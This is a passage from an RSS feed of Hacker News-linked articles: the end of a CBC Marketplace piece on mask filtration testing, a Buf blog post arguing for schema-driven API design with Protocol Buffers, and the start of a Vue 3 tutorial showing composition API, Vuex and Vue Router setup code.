460w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/blue-three-ply-mask.jpg 620w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/blue-three-ply-mask.jpg 780w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/blue-three-ply-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/blue-three-ply-mask.jpg"></p></div><figcaption>An example of a blue three-ply surgical-type mask Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Blue three-ply surgical-type masks</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_300/2-ply-high-thread-count-cotton-mask.png 300w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_460/2-ply-high-thread-count-cotton-mask.png 460w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_620/2-ply-high-thread-count-cotton-mask.png 620w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_780/2-ply-high-thread-count-cotton-mask.png 780w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_1180/2-ply-high-thread-count-cotton-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_780/2-ply-high-thread-count-cotton-mask.png"></p></div><figcaption>One of the two-ply, high thread count cotton masks Marketplace tested.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Blue three-ply surgical-type disposable masks also reported some of the highest filtration efficiency rates in the <em>Marketplace</em> test, which was of no surprise to Scott, as most contain that melt-blown, non-woven polypropylene fabric.&nbsp;</p>  <p>"It's this interwoven matrix of fibre. Air needs to travel around each one of those fibres and it meets the next fibre and it needs to bend its path. So as it does that, those fabrics pull out lots and lots of particles," said Scott.</p>  <h2>Two-ply and three-ply cotton masks&nbsp;</h2>  <p><em>Marketplace</em> also tested a number of cotton masks, including a two-layer, 100 per cent cotton mask, and a three-layer, 100 per cent cotton mask. More layers of cotton didn't necessarily mean a better mask. The three-layer cotton mask <em>Marketplace</em> tested did not perform well, but the two-layer cotton mask did.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/three-ply-cotton-mask.jpg 300w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/three-ply-cotton-mask.jpg 460w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/three-ply-cotton-mask.jpg 620w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/three-ply-cotton-mask.jpg 780w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/three-ply-cotton-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/three-ply-cotton-mask.jpg"></p></div><figcaption>One of the three-ply cotton masks Marketplace tested. Thread count unknown.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>There was also a noticeable jump in filtration efficiency in cotton masks made with a higher thread count.</p>  <p>Masks made with 600 and 680 thread count cotton had filtration efficiencies almost twice that of the other cotton masks tested. Scott said the weave of a fabric is critical when it comes to catching those potentially harmful particles.&nbsp;</p>  <p>When it comes to cotton masks, <em>Marketplace</em>'s test suggested&nbsp;the tighter the weave, the better.&nbsp;</p>  <p>Scott points out that manufacturers of consumer masks are not currently required to disclose details about thread count, and without that information it's difficult to say for certain what contributed to some cotton masks' poorer performance.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks.png 300w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks.png 460w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks.png 620w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png 780w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png"></p></div><figcaption>Valve masks, like the one seen here, are not effective at blocking COVID-19.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Masks to avoid</h2>  <p>Scott said consumers should avoid wearing valve masks. While they are useful for protecting someone from inhaling paint fumes or when working in a wood shop, they do not help control the spread of the virus.</p>  <p>The reason is simple.&nbsp;</p>  <p>"Air only moves through the filter part of the mask when air comes in. It doesn't move through the filter to exhale. It moves through the valve," he said. "So there's nothing to intercept those particles that you may be shedding into the environment."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks-pm-security-detail.png 300w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks-pm-security-detail.png 460w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks-pm-security-detail.png 620w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png 780w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks-pm-security-detail.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png"></p></div><figcaption>Although valve masks are not recommended by the Public Health Agency of Canada, some members of the federal security force at Canada’s Parliament in Ottawa were seen wearing them.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p><a href="https://www.torontopearson.com/en/whats-happening/stories/change-in-mask-regulations"><u>Transport Canada</u></a> has banned the wearing of valve masks, as has <a href="https://www.viarail.ca/en/preventive-measures-COVID-19#in-station"><u>Via Rail</u></a>, and airlines such as <a href="https://www.aircanada.com/ca/en/aco/home/book/travel-news-and-updates/2020/travelguidelines.html"><u>Air Canada</u></a>. <a href="https://www.toronto.ca/wp-content/uploads/2020/04/97f8-COVID-19-Guidance-for-Use-of-Face-Masks-and-Coverings-by-Public.pdf"><u>Toronto</u></a>, <a href="https://www.ottawapublichealth.ca/en/public-health-topics/masks.aspx"><u>Ottawa Public Health</u></a>, <a href="https://www.hamilton.ca/coronavirus/face-coverings-and-masks"><u>Hamilton Public Health</u></a> and the <a href="http://www.bccdc.ca/Health-Professionals-Site/Documents/Face-masks.pdf"><u>BC CDC</u></a> all recommend against the use of valve masks.</p>  <p>The Public Health Agency of Canada (PHAC) said: "<a href="https://protect-eu.mimecast.com/s/OstXC19nnf0jLkiLNse4?domain=canada.ca"><u>Masks with exhalation valves are not recommended,</u></a> because they don't protect others from COVID-19 and don't limit the spread of the virus."&nbsp;</p>  <ul>   <li><strong>Subscribe to the weekly <a href="https://subscriptions.cbc.ca/listmanagement/forms/marketplace-watchdog"><em>Marketplace </em>newsletter</a></strong></li>  </ul>  <p>Despite this, some members of the federal security force at Canada's Parliament in Ottawa, mandated to provide physical security for parliamentarians, employees and visitors to the parliamentary precinct, have been wearing valve masks while on duty.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/rayon-mask.jpg 300w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/rayon-mask.jpg 460w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/rayon-mask.jpg 620w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg 780w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/rayon-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg"></p></div><figcaption>One of the rayon masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>In an email, the Parliamentary Protective Service told Marketplace: "The masks issued by the Parliamentary Protective Service (the Service), despite having a valve, meet the criteria outlined by PHAC regarding the appropriate use of non-medical mask or face covering. The Service has since replenished its stock with masks that do not include a breathing valve."</p>  <h2>Other masks to avoid</h2>  <p>The neck gaiter-style mask and bandanas were among the poorest performing when it came to filtration efficiency rates. Scott said the thin, porous materials they are made from is likely the reason they did a poor job filtering out any potentially harmful particles, which is made worse by their loose fit.</p>  <p>A two-layer, 100 per cent rayon mask was also among the worst performing masks Marketplace tested for filtration efficiency.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/gaiter-mask.jpg 300w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/gaiter-mask.jpg 460w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/gaiter-mask.jpg 620w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gaiter-mask.jpg 780w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/gaiter-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gaiter-mask.jpg"></p></div><figcaption>One of the gaiter-style masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Lack of standards, testing for consumer masks</h2>  <p>Physician and infectious diseases specialist Monica Gandhi from the University of California, San Francisco expects mask requirements to be around for the foreseeable future, at least until there is enough of a safe and effective vaccine.&nbsp;</p>  <p>"I have become more and more convinced that they are one of the most important pillars of pandemic control," said Gandhi.&nbsp;</p>  <p>As <em>Marketplace</em>'s research has found that consumer masks protect the wearer in addition to others,&nbsp;public health agencies recently updated their guidelines to include that messaging.</p>  <p>Last week, Health Canada quietly updated its mask-wearing guidelines, adding <a href="https://www.canada.ca/en/public-health/services/diseases/2019-novel-coronavirus-infection/prevention-risks/about-non-medical-masks-face-coverings.html"><u>"to protect yourself and others</u></a>." On Tuesday, the U.S. Centers&nbsp;for Disease Control went further,&nbsp;<a href="https://www.cdc.gov/coronavirus/2019-ncov/more/masking-science-sars-cov2.html"><u>updating its recommendations</u></a> in favour of masking by outlining a number of studies that point to masking as drastically reducing transmission of the disease for both the wearer and others.</p>  <p><strong><em>WATCH | How masks protect not only others, but the wearer, too:</em></strong></p>  <p><span><span><div><div role="button" tabindex="0" title="Mask wearing doesn't only protect others, it also protects you, expert says"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/970/143/CP111461144_1280x720_1818907203591.jpg" alt=""></p></div></div></div><span>An infectious disease specialist cites research that suggests wearing a mask can lead to less severe illness from COVID-19 by limiting how much of the virus someone inhales.<!-- --> <!-- -->0:35</span></span></span></p>  <p>"This is an incredibly exciting update from the CDC since messaging that allows the public to know that masks protect you as well as others will be more powerful in convincing skeptics that masks are important in public spaces to slow down spread and disease from COVID-19,"&nbsp;Gandhi said.&nbsp;</p>  <p>She also made note of research released in September that …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481">https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085480</guid>
            <pubDate>Fri, 13 Nov 2020 18:14:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API design is stuck in the past]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 123 (<a href="https://news.ycombinator.com/item?id=25085276">thread link</a>) | @kentonv
<br/>
November 13, 2020 | https://buf.build/blog/api-design-is-stuck-in-the-past | <a href="https://web.archive.org/web/*/https://buf.build/blog/api-design-is-stuck-in-the-past">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>November 12, 2020</p><p>The industry has embraced statically typed languages, but API design remains twenty years in the past. Schema driven development presents an opportunity to pull API design into the present. </p></div></div><div><div><div><p>Two decades ago, it was widely argued that dynamic programming languages were more productive because you didn't have to spend time dealing with type signatures. The only reason, then, to use a statically typed language, was for better performance. Truth be told, at the time, this argument had some validity, and many organizations chose to move away from the Javas of the world, and towards the Pythons. However, this was largely because of the specific statically-typed languages in wide use, and because of a lack of tooling available at the time to support them. </p><p>‍</p><p>By now, that tooling has become much more widely available. In fact, the industry has learned over time that statically typed languages actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability. Editor features like auto-complete and jump-to-definition make programmers much more productive, and are mostly only possible in statically typed languages. We see TypeScript taking off, even though it has no performance benefit over JavaScript, because it is more productive. In addition, larger code bases become easier to manage when everyone is able to have some typed reason about each others’ code,<strong> </strong>resulting in the ability to add features faster, with fewer bugs. In other words, the benefit of maintaining type signatures now well outweighs the cost.&nbsp;&nbsp;</p><blockquote>The industry has learned over time that statically typed languages &nbsp;actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability</blockquote><h3>‍<strong>The status quo for APIs is still freeform</strong></h3><p>When it comes to network APIs, however, the industry is still twenty years behind. Most developers continue to rely on the path of least resistance: defining RESTful services, relying on JSON as the data format and HTTP as the transport protocol. Some feel that dynamically typed JSON, along with loosely-defined REST standards, are more productive than the alternatives, or that the learning curve associated with other API standards is too steep. However, similar to dynamic languages 20 years ago, the status quo of API development leaves a lot of room for improvement.</p><p>‍</p><p>API development today is overwhelmingly freeform. Fundamentally, that means that every company -- and every team within every company -- that claims their services are RESTful can actually have very different API design standards. For example, naming conventions, pagination and versioning could all be radically different on one team compared to another. Often, a team might overload an object with unnecessary fields and use inconsistent data types. Unfortunately, this causes a number of problems.</p><h3>‍<strong>Freeform APIs can cause major problems</strong></h3><p>It’s straightforward to understand why having APIs structured differently harms service grokability. When APIs are designed differently, it’s not always obvious how the service should be used, preventing teams from quickly and confidently building applications around a new service.&nbsp;</p><p>Organizations do make attempts to standardize the service structure, mostly by way of API style guides. Setting a style guide is a headache in and of itself, either requiring a team to craft one or select a popular one. Teams and individuals can rarely agree on a style guide, so this decision often gets ignored and relitigated regularly in code reviews. Ultimately, even if there was internal consensus on an approach to style, there is no good way to enforce, monitor or lint APIs for adherence.</p><p>An inconsistent approach to service design and maintenance has another unintended effect: breaking changes. In a freeform API environment, you can’t fully understand the downstream impacts of making changes to the contract. This works in the opposite direction too; clients with an updated view of the world talking to servers that remain in need of an update, including during rolling updates, can send requests that servers do not understand. There isn’t a good way to work around this as an organization. You either expect that the service will consistently break users, or you develop some sort of internal process to better manage changes to the contract. Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</p><blockquote>Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</blockquote><h3>‍<strong>The opportunity for schema driven development</strong></h3><p>It’s time for the industry to shift from a freeform approach to a world where all APIs are defined programmatically with schemas. Schema driven development solves many of the challenges summarized above. APIs are much easier to grok and can be relied on from day one. Organizations can set and enforce API standards across multiple teams. Service owners can make the changes they need to their service, with more structure in place to prevent breaking clients.&nbsp;</p><p>‍</p><p>This is already a major improvement, but the full opportunity for schemas to improve developer productivity is much greater. Similar to the way that statically typed languages enabled new potential for tools to improve developer productivity, the major promise of schema driven development is the assets that the schema can generate automatically. This is a topic big enough to explore in another article, but suffice it to say, relying on a schema can automate all of the boilerplate code required to actually interact with services.&nbsp;</p><p>‍</p><p>Today, schema driven API protocols are sometimes viewed as something you use only if performance matters. In the same way that typed languages needed tooling to support their adoption, a tooling ecosystem is needed to support the use of schema driven API protocols.&nbsp;</p><p>‍</p><p>We at Buf feel that the best option available today for schema driven development is Protocol Buffers (a topic we’ll explore in a future article), and we’re hard at work building such tooling to support organizations using Protobuf to define their services. We hope that with this kind of tooling, teams will look to API schemas for all-around productivity gains, and not just performance.</p></div></div></div></div>]]>
            </description>
            <link>https://buf.build/blog/api-design-is-stuck-in-the-past</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085276</guid>
            <pubDate>Fri, 13 Nov 2020 18:00:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use TypeScript in Vue 3]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084928">thread link</a>) | @webdevetc
<br/>
November 13, 2020 | https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3 | <a href="https://web.archive.org/web/*/https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-area"><p><a href="https://github.com/vuejs/vue-next/releases/tag/v3.0.0" target="_blank" rel="noopener">Vue 3.0</a> was (finally!) released a little while ago. It is <em>mostly</em> compatible with the old Vue 2 way of doing things... but lots have changed and there are many new ways of doing things. </p>
<p><strong>This is a guide to setting things up in Vue 3 using the Vue 3 composition API, and instructions for adding packages such as Vuex, Vue Router, Vue Test Utils and setting up Typescript support with Vue 3</strong>. It is intended for readers who are already familiar with Vue 2 but are looking for a tutorial/guide to move their codebase to use Vue 3.</p>
<p>I've created a <a href="https://webdevetc-vue3-example-starter.netlify.app/" target="_blank" rel="noopener">sample app</a>, along with <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">the Vue 3 app source code on Github</a>. </p>
<p>The app is quite basic and is meant just for demonstration purposes. I find tutorials and guides much easier to see when they have a bigger application to refer to, rather than just short snippets.</p>
<h2 id="a-quick-guide-to-vue-3s-composition-api">A quick guide to Vue 3's composition API</h2>
<p>There are tons of guides on Vue 3's composition API. I am really excited to start using it in some projects (although I still have some reservations about how useful it will be - but I felt the same about React hooks, and the have really picked up in popularity)</p>
<p>In Vue 2 (and also in Vue 3 as you can still use the <strong>options API</strong>) you would probably be used to seeing things like this:</p>
<pre><code><span> </span><span>// ...</span>
<span> </span><span>export</span><span> </span><span>default</span><span> </span><span>{</span>
<span> </span><span>data</span><span>()</span><span> </span><span>{</span>
<span>   </span><span>return</span><span> </span><span>{</span>
<span>     postTitle</span><span>:</span><span> </span><span>'</span><span>a default title</span><span>'</span><span>,</span><span>    </span>
<span>   </span><span>}</span>
<span> </span><span>},</span>
<span> methods</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>updateTitle</span><span>(</span><span>newValue</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>this</span><span>.</span><span>postTitle</span><span> </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>},</span>
<span> computed</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>numWordsInTitle</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>this</span><span>.</span><span>postTitle</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>}</span>
<span>}</span></code></pre>
<p>And then in your <code>&lt;template&gt;</code> you could reference those data/methods/computed properties:</p>
<pre><code><span>&lt;</span><span>template</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>h1</span><span>&gt;{{</span><span> </span><span>postTitle</span><span> </span><span>}}&lt;/</span><span>h1</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Post has </span><span>{{</span><span> </span><span>numWordsInTitle</span><span> </span><span>}}</span><span> words</span><span>&lt;/</span><span>p</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>button</span><span> </span><span>@click</span><span>=</span><span>"</span><span>updateTitle</span><span>(</span><span>'</span><span>something new</span><span>'</span><span>)</span><span>"</span><span>&gt;</span><span>Update to 'something new'</span><span>&lt;/</span><span>button</span><span>&gt;</span>
<span>&lt;/</span><span>template</span><span>&gt;</span></code></pre>
<p><strong>To convert from that 'old' Vue 2 options API to using the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">Vue 3 composition API</a></strong>, you would instead do the following:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>defineComponent</span><span>,</span><span> </span><span>ref</span><span>,</span><span> </span><span>computed</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>
<span>  name</span><span>:</span><span> </span><span>'</span><span>BlogSummary</span><span>'</span><span>,</span>
<span>  components</span><span>:</span><span> </span><span>{},</span>
<span>  props</span><span>:</span><span> </span><span>{</span>
<span>    post</span><span>:</span><span> </span><span>Object</span><span>,</span>
<span>  </span><span>},</span>
<span>  </span><span>setup</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span>
<span>      </span><span>const</span><span> </span><span>postTitle</span><span> </span><span>=</span><span> </span><span>ref</span><span>(</span><span>'</span><span>postTitle</span><span>'</span><span>)</span><span>;</span>
<span>      </span><span>const</span><span> </span><span>numWordsInTitle</span><span> </span><span>=</span><span> </span><span>computed</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>postTitle</span><span>.</span><span>value</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length)</span><span>;</span>
<span>      </span><span>const</span><span> </span><span>updateTitle</span><span> </span><span>=</span><span> </span><span>(</span><span>newValue</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>postTitle</span><span>.</span><span>value </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>  </span>
<span>      </span><span>return</span><span> </span><span>{</span><span> </span><span>postTitle</span><span>,</span><span> </span><span>numWordsInTitle</span><span>,</span><span> </span><span>updateTitle</span><span> </span><span>}</span>
<span>  </span><span>}</span>
<span>}</span><span>)</span><span>;</span></code></pre>
<p>The <code>&lt;template&gt;...&lt;/template&gt;</code> part would be the same as the above. Anything returned from <code>setup()</code>'s object will be available to use in the <code>&lt;template&gt;</code>.</p>
<p>For a very small example of a Vue 3 component which uses <code>setup()</code> and then uses the data returned from that function within <code>&lt;template&gt;</code>, check out <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/src/components/layout/components/Sidebar.vue" target="_blank" rel="noopener">this example component</a></p>
<p>There is much more that can be said about the composition API. But this is just a brief introduction. I have a more <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">in-depth overview of Vue 3's composition API here</a>.</p>
<h3 id="set-up-vue-3-with-sassscss">Set up Vue 3 with Sass/SCSS</h3>
<p>It is very easy to set up Sass with Vue 3, which I always prefer as it makes writing CSS a little nicer.</p>
<p>Basic setup of Sass in Vue 3 is quite easy: <code>yarn add -D sass-loader sass</code>. I have written more about <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-global-scss-sass-variables/">setting up Sass in Vue 3 here (including global config)</a></p>
<h3 id="setting-up-vuex-in-vue-3">Setting up Vuex in Vue 3</h3>
<p>There are some arguments that Vuex will not be needed as often, thanks to the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">composition API in Vue 3</a>. But I think for large applications it will still be a staple part of using Vue.</p>
<p><code>yarn add vuex</code></p>
<p>(I'm using 4.0.0, which works with Vue 3)</p>
<p>In your <code>main.js</code> or <code>main.ts</code> file you will need to set it up like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span>createStore</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vuex</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span><span>;</span><span> </span><span>// Your main component</span>

<span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>createStore</span><span>(</span><span>{</span>
<span>    state</span><span>:</span><span> </span><span>{</span>
<span>        posts</span><span>:</span><span> []</span><span>,</span>
<span>    </span><span>},</span>
<span>    getters</span><span>:</span><span> </span><span>{</span>
<span>        </span><span>allPosts</span><span>(</span><span>state</span><span>)</span><span> </span><span>{</span>
<span>            </span><span>return</span><span> </span><span>state</span><span>.</span><span>posts</span>
<span>        </span><span>},</span>
<span>    </span><span>},</span>
<span>    mutations</span><span>:</span><span> </span><span>{},</span>
<span>    actions</span><span>:</span><span> </span><span>{},</span>
<span>    modules</span><span>:</span><span> </span><span>{}</span>
<span>}</span><span>)</span>

<span>createApp</span><span>(</span><span>App</span><span>)</span>
<span>    </span><span>.</span><span>use</span><span>(</span><span>store</span><span>) </span><span>// &lt;&lt; this is important</span>
<span>    </span><span>.</span><span>mount</span><span>(</span><span>'</span><span>#app</span><span>'</span><span>)</span></code></pre>
<p>Once you have your Vue 3 Vuex config set up, you just need to access the store in your Vue 3 components.</p>
<p>One way to do this is via the composition API:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>computed</span><span>,</span><span> </span><span>defineComponent</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>
<span>import</span><span> </span><span>{</span><span>useStore</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>vuex</span><span>"</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>
<span>  name</span><span>:</span><span> </span><span>'</span><span>SinglePost</span><span>'</span><span>,</span>
<span>  components</span><span>:</span><span> </span><span>{},</span>
<span>  </span><span>setup</span><span>()</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>useStore</span><span>()</span><span>;</span>
<span>    </span><span>const</span><span> </span><span>post</span><span> </span><span>=</span><span> </span><span>computed</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>store</span><span>.</span><span>getters</span><span>.</span><span>allPosts</span><span>.</span><span>find</span><span>(</span><span>(</span><span>post</span><span>:</span><span>any</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>post</span><span>.</span><span>slug</span><span> </span><span>===</span><span> </span><span>route</span><span>.</span><span>params</span><span>.</span><span>slug</span><span>))</span>

<span>    </span><span>return</span><span> </span><span>{</span>
<span>      </span><span>post</span><span>,</span>
<span>    </span><span>}</span>
<span>  </span><span>},</span>
<span>}</span><span>)</span><span>;</span></code></pre>
<p>For a more in-depth example of <strong>how to use Vuex 4 in Vue 3</strong>, I recommend <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">looking at the sample Vue 3 boilerplate app, which includes Vue 3 and Vuex config</a>.</p>
<h3 id="setting-up-vue-router-in-vue-3">Setting up Vue Router in Vue 3</h3>
<p>Vue router works well with Vue 3. To get started you must install it with: <code>yarn add vue-router</code></p>
<p>Then update your <code>main.ts</code> or <code>main.js</code> to something like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span> </span><span>createRouter</span><span>,</span><span> </span><span>createWebHashHistory</span><span>,</span><span> </span><span>RouteRecordRaw</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue-router</span><span>'</span>
